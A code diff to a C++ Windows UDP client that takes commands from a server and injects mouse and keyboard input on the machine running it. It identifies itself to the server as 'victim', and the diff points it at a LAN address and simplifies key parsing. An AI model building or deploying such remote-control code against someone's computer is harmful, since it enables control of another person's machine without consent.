@@ -7,7 +7,7 @@ using namespace std;
 #pragma comment(lib,"ws2_32.lib")
 #pragma warning(disable : 4996)
 
-#define SERVER "127.0.0.1"
+#define SERVER "192.168.1.211"
 #define BUFLEN 1024
 #define PORT 8200
 
@@ -24,8 +24,6 @@ int s, slen = sizeof(server_ip);
 char buf[BUFLEN];
 char message[BUFLEN] = "victim";
 WSADATA wsa;
-int codes[] = { 1, 2, 4, 32 };
-string names[] = { "left_mouse", "right_mouse", "middle_mouse", " " };
 int horizontal = 0;
 int vertical = 0;
 
@@ -45,15 +43,7 @@ void move_cursor(int x_percent, int y_percent) {
 };
 
 int key_name_to_code(string key_name) {
-    if ((key_name <= "9" && key_name >= "0") || (key_name <= "z" && key_name >= "a") || (key_name <= "Z" && key_name >= "A")) {
-        return int(toupper(key_name[0]));
-    }
-    for (int i = 0; i < 4; i++) {
-        if (key_name == names[i]) {
-            return codes[i];
-        }
-    }
-    return 0;
+    return stoi(key_name);
 };
 
 
@@ -143,6 +133,7 @@ bool is_same_ip(sockaddr_in ip1, sockaddr_in ip2) {
 
 void handle_packet(char buf[]){
 //todo handle a fucking packet
+    cout << buf << endl;
     
     if (is_same_ip(last_recieve_ip, server_ip)) { // https://www.digitalocean.com/community/tutorials/convert-string-to-char-array-c-plus-plus
         string x = buf;
@@ -203,8 +194,6 @@ int main()
     mouse_input.mi.time = 0;
     //-------------------------------------------------------------------
 
-
-    
     while (true) {
         memset(buf, '\0', BUFLEN);
         if (recvfrom(s, buf, BUFLEN, 0, (struct sockaddr*)&last_recieve_ip, &slen) == SOCKET_ERROR) {
